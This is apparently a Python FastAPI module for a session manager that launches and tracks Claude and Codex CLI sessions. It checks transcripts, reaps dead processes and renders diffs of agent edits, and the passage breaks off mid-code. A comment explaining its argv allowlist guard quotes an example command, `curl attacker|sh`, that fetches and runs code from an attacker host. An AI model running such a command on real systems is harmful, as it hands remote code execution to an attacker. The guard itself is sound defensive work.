"""REST + WebSocket endpoints for Session Manager."""
from __future__ import annotations

import asyncio
import json
import logging
import os
import time
from collections import OrderedDict
from datetime import UTC, datetime, timedelta
from functools import lru_cache
from pathlib import Path
from typing import Any

from fastapi import (
    APIRouter,
    HTTPException,
    Request,
    Response,
    WebSocket,
    WebSocketDisconnect,
)
from pydantic import BaseModel, Field

from csm.api._assets import asset, script_tag
from csm.api._deps import _require_access_ws
from csm.api._serialize import iso_utc
from csm.config import settings
from csm.models import Session as SessionModel
from csm.models.session import SessionStatus, SessionType
from csm.modules.agent.jsonl_fast_tail import (
    JsonlFastTail,
    conversation_jsonl_path,
    get_history,
)
from csm.modules.session_manager.manager import ClaudeSessionIdConflict, SessionManager

log = logging.getLogger(__name__)

# JSONL "meta" line types: emitted by claude before / around real
# conversation content but by themselves don't represent anything
# `--resume` can restore. A JSONL containing ONLY these lines is what
# claude writes when it starts up and dies within a few hundred ms
# (openpi incident: a 115-byte transcript that broke Resume 6× in a row
# because `jsonl_present=true` said "go ahead"). Message types that DO
# count as resumable content: "user", "assistant", "tool_use",
# "tool_result", "system" (transcript prompts).
_JSONL_META_TYPES = frozenset({
    "permission-mode",
    "file-history-snapshot",
    "summary",
})


@lru_cache(maxsize=2048)
def _jsonl_has_history_cached(path: str, mtime_ns: int, size: int) -> bool:
    """Scan one immutable `(path, mtime, size)` transcript snapshot.

    The cache key changes whenever Claude appends to or replaces a transcript,
    so repeated Session-list refreshes avoid rereading the same files while a
    newly-created first message still invalidates a previously empty result.
    ``mtime_ns`` and ``size`` are intentionally unused in the body: they are
    version components of the cache key.
    """
    del mtime_ns, size
    try:
        # Cap the scan to protect against pathological giant files —
        # 512KB is plenty to prove *some* real message exists at the
        # head of any transcript claude has written more than a few
        # exchanges to. This also caps a directory-listing hot path
        # cost at ~200 * 512KB = 100MB read per full serialize.
        with Path(path).open("r", encoding="utf-8", errors="replace") as f:
            scanned = 0
            for line in f:
                scanned += len(line)
                line = line.strip()
                if not line:
                    continue
                try:
                    obj = json.loads(line)
                except (json.JSONDecodeError, ValueError):
                    continue
                if not isinstance(obj, dict):
                    continue
                t = obj.get("type")
                if isinstance(t, str) and t not in _JSONL_META_TYPES:
                    return True
                if scanned >= 512 * 1024:
                    break
        return False
    except OSError:
        return False


def _jsonl_has_history(p: Path) -> bool:
    """True iff the JSONL contains at least one non-meta message line."""
    try:
        stat = p.stat()
    except OSError:
        return False
    return _jsonl_has_history_cached(str(p), stat.st_mtime_ns, stat.st_size)


def _jsonl_present(cwd: str, claude_sid: str | None) -> bool:
    """True iff the transcript file claude would `--resume` against exists
    AND contains at least one real message line.

    The "has content" half of this check is the fix for the openpi
    incident: claude sometimes crashes within ~500ms of spawn, leaving
    a JSONL that contains only meta lines (permission-mode,
    file-history-snapshot). The file exists on disk but `--resume`
    against it produces another crashing subprocess — every Resume
    click compounds the mess. Requiring real content here means
    `canResume` (frontend) and the /resume preflight (backend) both
    refuse the doomed spawn instead of retrying it.
    """
    if not claude_sid or not cwd:
        return False
    try:
        p = conversation_jsonl_path(settings.claude_projects_dir, cwd, claude_sid)
    except Exception:
        return False
    try:
        if not p.is_file():
            return False
    except OSError:
        return False
    return _jsonl_has_history(p)


# Result-cache for the session-LIST hot path only. `_jsonl_present` does two
# stat() syscalls per row (is_file + the stat that keys the read-cache); the
# list endpoint is polled every few seconds and serializes up to 500 rows, so
# on NFS / under high I/O-wait those ~1000 stats stall a single to_thread past
# axios's 30s timeout ("Could not sync sessions: timeout"). A transcript's
# present/has-history status is effectively stable (it doesn't revert), so a
# short TTL collapses repeated polls — and concurrent clients — to one FS pass.
# NOT used by the /resume preflight (line ~245), which must stay authoritative.
_JSONL_PRESENT_TTL_SEC = 20.0
_jsonl_present_cache: dict[tuple[str, str], tuple[bool, float]] = {}


def _jsonl_present_cached(cwd: str, claude_sid: str | None) -> bool:
    if not claude_sid or not cwd:
        return False
    key = (cwd, claude_sid)
    now = time.monotonic()
    hit = _jsonl_present_cache.get(key)
    if hit is not None and now - hit[1] < _JSONL_PRESENT_TTL_SEC:
        return hit[0]
    val = _jsonl_present(cwd, claude_sid)
    # Bound growth over long uptime (sessions come and go); simple clear on
    # overflow is fine — the cache repopulates lazily on the next serialize.
    if len(_jsonl_present_cache) > 4096:
        _jsonl_present_cache.clear()
    _jsonl_present_cache[key] = (val, now)
    return val


def _pid_is_alive(pid: int) -> bool:
    """Process existence probe that does not mistake Linux zombies for live."""
    try:
        stat = Path(f"/proc/{pid}/stat").read_text(encoding="utf-8")
        close_paren = stat.rfind(")")
        if close_paren >= 0 and stat[close_paren + 2 : close_paren + 3] in {"Z", "X"}:
            return False
    except FileNotFoundError:
        return False
    except (OSError, UnicodeError):
        pass
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    except PermissionError:
        return True
    except OSError:
        return False
    return True

router = APIRouter(prefix="/api/sessions", tags=["sessions"])


def _mgr(request: Request) -> SessionManager:
    mgr = getattr(request.app.state, "session_manager", None)
    if mgr is None:
        raise HTTPException(status_code=503, detail="session manager not initialized")
    return mgr


async def _resolve_effective_agent(
    request: Request, requested: str | None,
) -> str:
    """Multi-agent v2 resolution chain for POST /api/sessions.

    Precedence: explicit request field > UserPreference.default_agent >
    hardcoded 'claude' fallback. Raises HTTPException(400) on unknown
    explicit agent (via `resolve_agent` -> UnknownAgentError).

    Registry / preference are optional (tests may skip them) — those
    tests use the hardcoded 'claude' fallback.
    """
    from csm.backends.errors import UnknownAgentError
    reg = getattr(request.app.state, "adapter_registry", None)
    sm = getattr(request.app.state, "sessionmaker", None)
    user_default = "claude"
    if sm is not None:
        from csm.models import UserPreference
        try:
            async with sm() as db:
                pref = await db.get(UserPreference, 1)
                if pref is not None:
                    user_default = pref.default_agent
        except Exception:
            # DB unavailable — fall back to hardcoded default rather than
            # 500-ing the session-create request. Prefer to spawn than
            # to block.
            pass
    if reg is not None:
        from csm.backends.resolver import resolve_agent
        try:
            return resolve_agent(
                explicit=requested,
                context_default=None,
                user_default=user_default,
                registry=reg,
            )
        except UnknownAgentError as e:
            raise HTTPException(status_code=400, detail=str(e))
    return requested or user_default


class CreateSessionBody(BaseModel):
    cwd: str
    type: SessionType = SessionType.INTERACTIVE
    title: str | None = None
    initial_prompt: str | None = None
    run_id: str | None = None
    argv: list[str] | None = None
    session_project_id: str | None = None
    # Which CLI-adapter to use. Free-form string — must match a name in
    # the AdapterRegistry. Defaults to the user's default (resolved by
    # the API handler; the field itself is optional so the client can omit).
    # `backend` is accepted as a deprecated alias for one release.
    agent: str | None = None
    backend: str | None = None  # deprecated alias for `agent`


def _serialize(row, *, check_jsonl: bool = True) -> dict[str, Any]:
    # `agent` is the canonical field name from v2. `backend` and
    # `codex_rollout_path` are echoed as aliases for one release so
    # existing clients don't break; new code should read `agent` /
    # `rollout_path`.
    agent = row.agent if hasattr(row, "agent") else "claude"
    rollout_path = row.rollout_path if hasattr(row, "rollout_path") else None
    return {
        "id": row.id,
        "title": row.title,
        "type": row.type.value if hasattr(row.type, "value") else row.type,
        "cwd": row.cwd,
        "status": row.status.value if hasattr(row.status, "value") else row.status,
        "pid": row.pid,
        "started_at": iso_utc(row.started_at),
        "ended_at": iso_utc(row.ended_at),
        "exit_code": row.exit_code,
        "external_session_id": row.external_session_id,
        "agent": agent,
        "rollout_path": rollout_path,
        # Deprecated aliases (one-release compat window). New consumers should
        # use `external_session_id` (adapter-neutral) and `agent` / `rollout_path`.
        "claude_session_id": row.external_session_id,
        "backend": agent,
        "codex_rollout_path": rollout_path,
        "superseded_by": row.superseded_by,
        # List endpoints fill this asynchronously in `_serialize_list_rows`;
        # single-row mutation/detail responses keep the direct disk-truth
        # check so Resume availability is immediately accurate.
        "jsonl_present": (
            _jsonl_present(row.cwd, row.external_session_id)
            if agent == "claude" and check_jsonl
            else False
        ),
        "associated_run_id": row.associated_run_id,
        "tags": row.tags or [],
        "last_activity_ts": iso_utc(row.last_activity_ts),
        "current_tool": row.current_tool,
        "last_assistant_msg": row.last_assistant_msg,
        "unread_count": row.unread_count,
        "session_project_id": row.session_project_id,
        "pinned": bool(row.pinned),
        "manual_unread": bool(row.manual_unread),
        "highlighted": bool(getattr(row, "highlighted", False)),
        "archived_at": iso_utc(getattr(row, "archived_at", None)),
    }


async def _serialize_list_rows(rows: list[Any]) -> list[dict[str, Any]]:
    """Serialize a list without blocking the asyncio request loop on disk I/O.

    Session rows themselves are copied synchronously while their SQLAlchemy
    attributes are available in the request task. Only the filesystem-bound
    Claude transcript checks run in a worker thread. Cached transcripts turn
    the common SSE reconciliation path into cheap stat calls.
    """
    items = [_serialize(row, check_jsonl=False) for row in rows]
    checks = [
        (index, row.cwd, row.external_session_id)
        for index, row in enumerate(rows)
        if items[index]["agent"] == "claude"
    ]
    if checks:
        present = await asyncio.to_thread(
            lambda: [
                (index, _jsonl_present_cached(cwd, external_id))
                for index, cwd, external_id in checks
            ]
        )
        for index, value in present:
            items[index]["jsonl_present"] = value
    return items


@router.post("")
async def create_session(body: CreateSessionBody, request: Request):
    # C2 (slot 2): argv[0] LAN-RCE guard. POST /api/sessions accepts an
    # `argv` list that is handed straight to PtyProcess.spawn — combined
    # with an explicitly configured 0.0.0.0 bind, any LAN peer could otherwise spawn
    # `["/bin/sh", "-c", "curl attacker|sh"]` as the CSM user. Restrict
    # argv[0] to "claude" (the only real workload); set
    # CSM_ALLOW_ARBITRARY_ARGV=1 to bypass for dev / test.
    # Multi-agent v2: `agent` is the canonical field; `backend` still
    # accepted as deprecated alias for one release. Resolve via the
    # standard chain: explicit > (context_default N/A for sessions) >
    # user_default.
    requested_agent = body.agent or body.backend  # accept legacy field
    effective_agent = await _resolve_effective_agent(request, requested_agent)
    # Ask the registry rather than re-reading the flag here. One reader means
    # spawn and event-ingestion can't disagree about whether an adapter is on
    # (they did: this used `settings`, which loads `.env`, while the registry
    # read os.environ alone). It also generalises — a future adapter gets the
    # same gate for free instead of another hardcoded branch.
    from csm.backends.registry import is_agent_enabled

    if not is_agent_enabled(effective_agent):
        flag = f"CSM_ENABLE_{effective_agent.upper()}"
        raise HTTPException(
            status_code=400,
            detail=(
                f"agent={effective_agent!r} is disabled by {flag}=0. "
                f"Remove the override or set {flag}=1."
            ),
        )
    if body.argv is not None and len(body.argv) > 0:
        # argv[0] allowlist depends on adapter so codex sessions aren't
        # rejected as "not claude".
        allowed_argv0 = {"claude": "claude", "codex": "codex"}
        expected = allowed_argv0.get(effective_agent, effective_agent)
        if body.argv[0] != expected:
            if os.getenv("CSM_ALLOW_ARBITRARY_ARGV") != "1":
                raise HTTPException(
                    status_code=400,
                    detail=(
                        f"argv[0] must be {expected!r} for agent={effective_agent!r}; "
                        f"got {body.argv[0]!r}. "
                        "Set CSM_ALLOW_ARBITRARY_ARGV=1 to override (dev only)."
                    ),
                )
    if not Path(body.cwd).is_dir():
        raise HTTPException(
            status_code=400,
            detail="cwd does not exist or is not a directory",
        )
    mgr = _mgr(request)
    try:
        row = await mgr.create_session(
            cwd=body.cwd,
            type=body.type,
            title=body.title,
            initial_prompt=body.initial_prompt,
            run_id=body.run_id,
            argv=body.argv,
            agent=effective_agent,
        )
    except ClaudeSessionIdConflict as e:
        raise HTTPException(
            status_code=409,
            detail=f"external_session_id {e.external_session_id} is already claimed by a live session",
        )
    # Apply session_project_id if the client provided one. Done as a
    # post-create UPDATE so create_session's signature stays stable across
    # every caller (AutomationRunner, WorkflowOrchestrator etc. don't care
    # about this field).
    if body.session_project_id:
        from csm.models.session import Session as _Session
        sm = request.app.state.sessionmaker
        async with sm() as db:
            sess = await db.get(_Session, row.id)
            if sess is not None:
                sess.session_project_id = body.session_project_id
                await db.commit()
                await db.refresh(sess)
                row = sess
    return _serialize(row)


@router.get("")
async def list_sessions(
    request: Request,
    status: str | None = None,
    type: str | None = None,
    limit: int = 200,
    offset: int = 0,
    include_agents: bool = False,
):
    """List sessions. By default agent-typed rows (chat_agent) are hidden —
    they're private state owned by the agent subsystem and should not pollute
    the user-facing Sessions view. Pass `include_agents=true` to include them,
    or pass `type=chat_agent,...` explicitly (an explicit type filter wins
    over the default exclusion)."""
    mgr = _mgr(request)
    status_in = [SessionStatus(s) for s in status.split(",")] if status else None
    if type:
        type_in: list[SessionType] | None = [SessionType(t) for t in type.split(",")]
    elif include_agents:
        type_in = None
    else:
        type_in = [SessionType.INTERACTIVE, SessionType.AUTO]
    limit = min(max(1, limit), 500)
    offset = max(0, offset)
    rows, total = await asyncio.gather(
        mgr.list_sessions(
            status_in=status_in,
            type_in=type_in,
            limit=limit,
            offset=offset,
        ),
        mgr.count_sessions(status_in=status_in, type_in=type_in),
    )
    # Do not infer dangling ``superseded_by`` pointers from this page alone.
    # With pagination the successor may simply live on another page. Purge
    # already clears predecessor pointers transactionally.
    # Zombie-row self-heal: for any row still shown as running-ish whose
    # recorded PID is dead, transition to CRASHED. Covers the case where
    # a resumed claude subprocess died so fast that its SessionEnd hook
    # raced create_session's commit and got dropped — without this the
    # UI keeps showing a dead session in Active and blocks the user's
    # next Resume attempt on the predecessor.
    live_states = {
        SessionStatus.RUNNING, SessionStatus.STARTING,
        SessionStatus.IDLE, SessionStatus.WAITING_INPUT,
        SessionStatus.WAITING_AUTH,
    }
    to_reap: list[SessionModel] = []
    for r in rows:
        if r.status not in live_states or not r.pid:
            continue
        if not _pid_is_alive(r.pid):
            to_reap.append(r)
    if to_reap:
        from csm.utils.time import now_utc_naive
        sm_ = request.app.state.sessionmaker
        async with sm_() as db:
            now = now_utc_naive()
            for stale in to_reap:
                fresh = await db.get(SessionModel, stale.id)
                if fresh is None or fresh.status not in live_states or not fresh.pid:
                    continue
                # Recheck under the write session to avoid a TOCTOU with
                # a concurrent /resume that just promoted the row.
                if _pid_is_alive(fresh.pid):
                    continue  # became alive between reads — leave alone
                fresh.status = SessionStatus.CRASHED
                fresh.ended_at = fresh.ended_at or now
                # Reflect back onto the in-memory row so the response
                # already shows the transition (users don't have to
                # refresh a second time to see it).
                stale.status = SessionStatus.CRASHED
                stale.ended_at = fresh.ended_at
            await db.commit()
    serialized_rows = await _serialize_list_rows(rows)
    return {
        "count": total,
        "page_count": len(rows),
        "offset": offset,
        "has_more": offset + len(rows) < total,
        "items": serialized_rows,
    }


@router.post("/reap-stale")
async def reap_stale_sessions(request: Request) -> dict[str, Any]:
    """Sweep Session rows stuck at `running` whose PID no longer exists.

    Root incident: when a resumed claude subprocess dies immediately (bad
    --resume sid → JSONL missing → subprocess exit within ~200ms), CSM's
    SessionEnd hook can race the create_session commit and get dropped
    as "unknown session". Meanwhile the PTY reader task should notice
    EOF and mark CRASHED, but empirically that path also drops the
    signal in edge cases. Result: zombie `running` rows with dead PIDs
    that block re-Resume from the predecessor.

    This endpoint is a manual + startup safety net. Idempotent; returns
    the list of ids we transitioned to CRASHED.
    """
    from sqlalchemy import select as _select

    reaped: list[dict[str, Any]] = []
    sm_ = request.app.state.sessionmaker
    async with sm_() as db:
        stmt = _select(SessionModel).where(
            SessionModel.status.in_((
                SessionStatus.RUNNING,
                SessionStatus.STARTING,
                SessionStatus.WAITING_AUTH,
                SessionStatus.WAITING_INPUT,
                SessionStatus.IDLE,
            ))
        )
        candidates = (await db.execute(stmt)).scalars().all()
        from csm.utils.time import now_utc_naive
        now = now_utc_naive()
        for r in candidates:
            if not r.pid:
                # No PID recorded — can't verify liveness. Skip.
                continue
            alive = _pid_is_alive(r.pid)
            if alive:
                continue
            # PID dead → row is a zombie. Transition to CRASHED and record.
            r.status = SessionStatus.CRASHED
            r.ended_at = r.ended_at or now
            reaped.append({
                "id": r.id,
                "title": r.title,
                "pid": r.pid,
                "prior_status": "running",
            })
        if reaped:
            await db.commit()
    return {"reaped": len(reaped), "items": reaped}


@router.get("/{sid}")
async def get_session(sid: str, request: Request):
    mgr = _mgr(request)
    row = await mgr.get_session(sid)
    if row is None:
        raise HTTPException(status_code=404, detail="session not found")
    return _serialize(row)


@router.post("/archive-ended")
async def archive_ended_sessions(request: Request):
    """Soft-archive every unarchived ended interactive session atomically."""
    from sqlalchemy import update

    from csm.utils.time import now_utc_naive

    sm = request.app.state.sessionmaker
    async with sm() as db:
        result = await db.execute(
            update(SessionModel)
            .where(
                SessionModel.type == SessionType.INTERACTIVE,
                SessionModel.status.in_((SessionStatus.EXITED, SessionStatus.CRASHED)),
                SessionModel.archived_at.is_(None),
            )
            .values(archived_at=now_utc_naive())
        )
        await db.commit()
    return {"archived": int(result.rowcount or 0)}


# --- Session Changes panel: per-session file edit history from JSONL ---
#
# Data source is the agent transcript (Claude project JSONL or Codex rollout),
# NOT the current filesystem or git. That means:
#   - a file that was edited then reverted still shows the edit here
#   - manual user edits between agent turns are invisible (the transcript
#     only records tool-mediated changes)
#   - if the agent has pruned the JSONL, we return an empty list, not 404
#     (the row still exists in CSM's DB — just no editing history to show)
async def _load_edits_for_session(
    request: Request, sid: str,
):
    """Common preamble for the two changes endpoints: resolve row → JSONL path
    → parse. Returns (row, edits). Raises HTTPException for the row-level 404."""
    from csm.modules.session_manager.changes import (
        find_codex_rollout,
        parse_codex_edits_from_rollout,
        parse_edits_from_jsonl,
    )

    mgr = _mgr(request)
    row = await mgr.get_session(sid)
    if row is None:
        raise HTTPException(status_code=404, detail="session not found")
    if not row.cwd:
        return row, []

    agent = getattr(row, "agent", "claude") or "claude"
    if agent == "codex":
        rollout: Path | None = None
        if row.rollout_path:
            candidate = Path(row.rollout_path)
            try:
                if candidate.is_file():
                    rollout = candidate
            except OSError:
                pass
        if rollout is None:
            rollout = await asyncio.to_thread(
                find_codex_rollout,
                settings.codex_sessions_dir,
                external_session_id=row.external_session_id,
                cwd=row.cwd,
                started_at=row.started_at,
            )
        if rollout is None:
            return row, []
        edits = await asyncio.to_thread(
            parse_codex_edits_from_rollout,
            rollout,
            cwd=row.cwd,
        )
        return row, _edits_in_session_window(row, edits)

    if not row.external_session_id:
        return row, []
    try:
        jp = conversation_jsonl_path(
            settings.claude_projects_dir, row.cwd, row.external_session_id,
        )
    except Exception:
        return row, []
    return row, _edits_in_session_window(row, parse_edits_from_jsonl(jp))


def _edits_in_session_window(row, edits: list) -> list:
    """Keep transcript edits attributable to this CSM row.

    Claude resume chains and Codex continued rollouts reuse one artifact,
    otherwise every row in the chain misleadingly reports the full
    conversation history as "this session". Timestamp-less legacy records
    are retained because there is no safer attribution signal.
    """
    start = row.started_at
    if start is None:
        return edits
    if start.tzinfo is None:
        start = start.replace(tzinfo=UTC)
    else:
        start = start.astimezone(UTC)
    start -= timedelta(seconds=10)
    end = row.ended_at
    if end is not None:
        if end.tzinfo is None:
            end = end.replace(tzinfo=UTC)
        else:
            end = end.astimezone(UTC)
        end += timedelta(seconds=10)

    out = []
    for edit in edits:
        raw = getattr(edit, "ts", "")
        if not raw:
            out.append(edit)
            continue
        try:
            stamp = datetime.fromisoformat(raw.replace("Z", "+00:00"))
            if stamp.tzinfo is None:
                stamp = stamp.replace(tzinfo=UTC)
            else:
                stamp = stamp.astimezone(UTC)
        except (TypeError, ValueError):
            out.append(edit)
            continue
        if stamp < start or (end is not None and stamp > end):
            continue
        out.append(edit)
    return out


_HUNK_HEADER_RE = _re_compile_hunk_header = None  # populated lazily below


def _reverse_apply_edits(disk_content: str | None, edits: list) -> str | None:
    """Reconstruct the pre-session file content by reverse-applying edits.

    We walk `edits` in **reverse** chronological order and replace each
    `new_string` with the corresponding `old_string`. This gives us the
    state of the file at session start, which we can then diff against
    the current disk content for a "one cumulative view" render.

    Returns `None` (caller falls back to per-edit view) if:
      - disk_content is None (file gone / unreadable)
      - any edit lacks a baseline (a Claude Write or Codex move/delete
        metadata record)
      - a MultiEdit-sub or Edit's `new_string` can't be found in the
        current-state buffer (later edit rewrote the region, or the
        user manually reverted)

    Best-effort by design — a returned `None` isn't an error, just a
    signal that the fallback per-edit view is safer than a partially-
    reconstructed misleading diff.
    """
    if disk_content is None:
        return None
    state = disk_content
    for edit in reversed(edits):
        if edit.tool == "Write" or edit.old is None:
            return None
        # `find` (not `rfind`): first occurrence is the safe pick — the
        # region claude edited was written most recently, so it should
        # appear before any residual earlier copies.
        idx = state.find(edit.new)
        if idx < 0:
            return None
        state = state[:idx] + edit.old + state[idx + len(edit.new):]
    return state


def _render_diff_table(diff_text: str, code_lexer) -> str:
    """Render unified diff as a 3-column table: old-ln / new-ln / code.

    Each code line gets per-language syntax highlighting via the provided
    pygments lexer (or plain HTML-escaped text if no lexer is available).
    Rows get `.diff-add`, `.diff-del`, `.diff-ctx`, `.diff-hunk` classes
    for row-level background tinting (VS Code / GitHub inline-diff style).
    Line numbers are computed from the `@@ -a,b +c,d @@` hunk headers.

    Returns a `<table class="diff-table">` string ready to be embedded
    in a diff-card body.
    """
    import re

    from pygments import highlight
    from pygments.formatters import HtmlFormatter

    from csm.api.files import _html_escape

    global _HUNK_HEADER_RE
    if _HUNK_HEADER_RE is None:
        _HUNK_HEADER_RE = re.compile(r"^@@ -(\d+)(?:,\d+)? \+(\d+)(?:,\d+)? @@")

    code_formatter = (
        HtmlFormatter(nowrap=True, cssclass="pyghi-code") if code_lexer else None
    )

    def hl(text: str) -> str:
        if code_formatter is None or not text:
            return _html_escape(text)
        return highlight(text, code_lexer, code_formatter).rstrip("\n")

    old_ln = new_ln = 0
    rows: list[str] = []
    for line in diff_text.split("\n"):
        if not line:
            continue
        m = _HUNK_HEADER_RE.match(line)
        if m:
            old_ln = int(m.group(1))
            new_ln = int(m.group(2))
            rows.append(
                f'<tr class="diff-hunk">'
                f'<td class="ln" colspan="2">…</td>'
                f'<td class="code">{_html_escape(line)}</td>'
                f'</tr>'
            )
            continue
        if line.startswith("--- ") or line.startswith("+++ "):
            # File headers — already surfaced in the card head; skip to
            # avoid visual noise inside the table.
            continue
        if line.startswith("+"):
            content = line[1:]
            rows.append(
                f'<tr class="diff-add">'
                f'<td class="ln ln-old"></td>'
                f'<td class="ln ln-new">{new_ln}</td>'
                f'<td class="code"><span class="marker">+</span>{hl(content)}</td>'
                f'</tr>'
            )
            new_ln += 1
        elif line.startswith("-"):
            content = line[1:]
            rows.append(
                f'<tr class="diff-del">'
                f'<td class="ln ln-old">{old_ln}</td>'
                f'<td class="ln ln-new"></td>'
                f'<td class="code"><span class="marker">-</span>{hl(content)}</td>'
                f'</tr>'
            )
            old_ln += 1
        elif line.startswith(" "):
            content = line[1:]
            rows.append(
                f'<tr class="diff-ctx">'
                f'<td class="ln ln-old">{old_ln}</td>'
                f'<td class="ln ln-new">{new_ln}</td>'
                f'<td class="code"><span class="marker"> </span>{hl(content)}</td>'
                f'</tr>'
            )
            old_ln += 1
            new_ln += 1

    return f'<table class="diff-table">{"".join(rows)}</table>'


def _render_single_edit_diff(edit, path: str, code_lexer) -> str:
    """Per-edit diff renderer (fallback path).

    Uses the same table renderer as the cumulative view so both views
    share visual language. Handles Codex move/delete metadata explicitly
    and the Write-with-no-baseline case by synthesising an all-added diff.
    """
    from difflib import unified_diff

    if edit.tool == "ApplyPatchDelete" and edit.old is None:
        return (
            '<div class="diff-noop">'
            "File deleted. Codex recorded the path but not the previous file contents."
            "</div>"
        )
    if edit.tool == "ApplyPatchMove":
        from csm.api.files import _html_escape

        source = _html_escape(edit.source_path or "unknown path")
        destination = _html_escape(path)
        return (
            '<div class="diff-noop">'
            f'File moved from <span class="mono">{source}</span> to '
            f'<span class="mono">{destination}</span>.'
            "</div>"
        )
    if edit.old is None:
        # Write: all lines added.
        new_str = edit.new
        fake = (
            f"--- a/{path}\t(before write)\n"
            f"+++ b/{path}\n"
            f"@@ -0,0 +1,{new_str.count(chr(10)) + 1} @@\n"
            + "\n".join(f"+{line}" for line in new_str.split("\n"))
        )
        return _render_diff_table(fake, code_lexer)

    diff_iter = unified_diff(
        edit.old.splitlines(keepends=True),
        edit.new.splitlines(keepends=True),
        fromfile=f"a/{path}",
        tofile=f"b/{path}",
        n=6,
    )
    diff_text = "".join(diff_iter)
    if not diff_text:
        return '<div class="diff-noop">Edit produced no textual change.</div>'
    return _render_diff_table(diff_text, code_lexer)


@router.get("/{sid}/changes")
async def list_session_changes(sid: str, request: Request) -> dict[str, Any]:
    """Files touched by the backing agent in this session, aggregated per-path.

    Response shape:
        {
          "sid": "<sid>",
          "files": [
            {"path": "/abs/path.py", "edit_count": 3,
             "tools": ["Edit","Write"], "first_ts": "...", "last_ts": "..."},
            ...
          ],
          "total_edits": 12
        }

    Ordered by `last_ts` descending so the most-recently-touched file
    sits at the top of the panel. Empty `files` is a valid response
    (session has no editing activity in its transcript).
    """
    from csm.modules.session_manager.changes import summarize_by_file

    row, edits = await _load_edits_for_session(request, sid)
    summaries = summarize_by_file(edits)
    return {
        "sid": row.id,
        "total_edits": len(edits),
        "files": [
            {
                "path": s.path,
                "edit_count": s.edit_count,
                "tools": sorted(s.tools),
                "first_ts": s.first_ts,
                "last_ts": s.last_ts,
                "additions": s.additions,
                "deletions": s.deletions,
                "change_kind": s.change_kind,
            }
            for s in summaries
        ],
    }


def _render_one_file_section(
    file_path: str,
    file_edits: list,
    anchor_id: str,
    n_context: int | None = 6,
) -> tuple[str, dict]:
    """Render one file's diff block (a section in the all-files page).

    Returns (html, meta). meta = {net_add, net_del, mode} for the sidebar.

    Mode is `whole-file` when reverse-apply succeeded and we could diff
    the full session-start snapshot against the current disk file
    (context = whole file so unchanged lines display in normal color
    between changed rows, matching VS Code inline diff). Falls back to
    per-edit cards when reconstruction is impossible.
    """
    from difflib import unified_diff

    from pygments.lexers import get_lexer_for_filename
    from pygments.util import ClassNotFound

    from csm.api.files import _html_escape

    try:
        with open(file_path, encoding="utf-8", errors="replace") as fh:
            disk_content = fh.read()
    except (OSError, ValueError):
        disk_content = None

    try:
        code_lexer = get_lexer_for_filename(file_path, stripnl=False)
    except ClassNotFound:
        code_lexer = None

    reconstructed_pre = _reverse_apply_edits(disk_content, file_edits)

    net_add = net_del = 0
    if reconstructed_pre is not None and disk_content is not None:
        pre_lines = reconstructed_pre.splitlines(keepends=True)
        cur_lines = disk_content.splitlines(keepends=True)
        # Context lines around each hunk. Default `n_context=6` gives
        # GitHub-style compact diffs so review can scan quickly without
        # scrolling through hundreds of unchanged lines. Pass `n_context
        # =None` (via `?full=1` on diff-view) to fall back to the old
        # whole-file behavior when the reviewer wants complete context.
        n = (max(len(pre_lines), len(cur_lines)) + 1
             if n_context is None else max(0, n_context))
        diff_iter = unified_diff(
            pre_lines, cur_lines,
            fromfile=f"a/{file_path}", tofile=f"b/{file_path}",
            n=n,
        )
        diff_text = "".join(diff_iter)
        if diff_text:
            # Cheap add/del count for the sidebar badge (walk raw lines).
            for line in diff_text.split("\n"):
                if line.startswith("+++") or line.startswith("---"):
                    continue
                if line.startswith("+"):
                    net_add += 1
                elif line.startswith("-"):
                    net_del += 1
            body_html = _render_diff_table(diff_text, code_lexer)
        else:
            body_html = '<div class="diff-noop">No net textual change after all edits.</div>'
        mode_label = "whole file" if n_context is None else f"±{n_context} context"
    else:
        # Per-edit fallback — Write records or reconstruction failure.
        card_bodies: list[str] = []
        for i, edit in enumerate(file_edits):
            hunk_html = _render_single_edit_diff(edit, file_path, code_lexer)
            tool_class = edit.tool.lower().replace("-sub", "")
            ts_html = _html_escape(edit.ts) if edit.ts else ""
            sub_label = f" · sub #{edit.sub_index + 1}" if edit.tool == "MultiEdit-sub" else ""
            card_bodies.append(
                f'<div class="edit-block" id="{anchor_id}-edit-{i + 1}">'
                f'  <div class="edit-block-head mono">'
                f'    <span class="edit-idx">#{i + 1} of {len(file_edits)}</span>'
                f'    <span class="edit-tool tool-{tool_class}">{_html_escape(edit.tool)}{sub_label}</span>'
                f'    <span class="edit-ts">{ts_html}</span>'
                f'  </div>'
                f'  <div class="edit-block-body">{hunk_html}</div>'
                f'</div>'
            )
            # rough count
            if edit.tool not in {"ApplyPatchDelete", "ApplyPatchMove"}:
                net_add += edit.new.count("\n") + 1
                if edit.old:
                    net_del += edit.old.count("\n") + 1
        body_html = "".join(card_bodies)
        mode_label = "per-edit"

    # File header: collapse toggle + path + meta + per-file actions.
    # `data-file-anchor` on the section powers scroll-spy in the diff-view.
    from urllib.parse import quote as urlquote
    file_path_enc = urlquote(file_path, safe="")
    file_html = (
        f'<section class="file-section" id="{anchor_id}" data-file-anchor="{anchor_id}">'
        f'  <div class="file-section-head">'
        f'    <button type="button" class="file-collapse-btn" '
        f'      title="Toggle this file (click header, or press c when focused)" '
        f'      aria-label="Collapse file section">'
        f'      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" '
        f'stroke-linecap="round" stroke-linejoin="round">'
        f'<polyline points="6 9 12 15 18 9"/></svg>'
        f'    </button>'
        f'    <span class="file-path mono">{_html_escape(file_path)}</span>'
        f'    <span class="file-meta mono">'
        f'      <span class="file-mode">{mode_label}</span>'
        f'      <span class="file-add">+{net_add}</span>'
        f'      <span class="file-del">−{net_del}</span>'
        f'    </span>'
        f'    <span class="file-actions">'
        f'      <button type="button" class="file-action" '
        f'        data-copy-path="{_html_escape(file_path)}" title="Copy path">'
        f'        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" '
        f'stroke-linecap="round" stroke-linejoin="round">'
        f'<rect x="9" y="9" width="13" height="13" rx="2"/>'
        f'<path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>'
        f'      </button>'
        f'      <a class="file-action" '
        f'        href="/api/files/preview?path={file_path_enc}" '
        f'        target="_blank" rel="noopener" title="Open file in preview">'
        f'        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" '
        f'stroke-linecap="round" stroke-linejoin="round">'
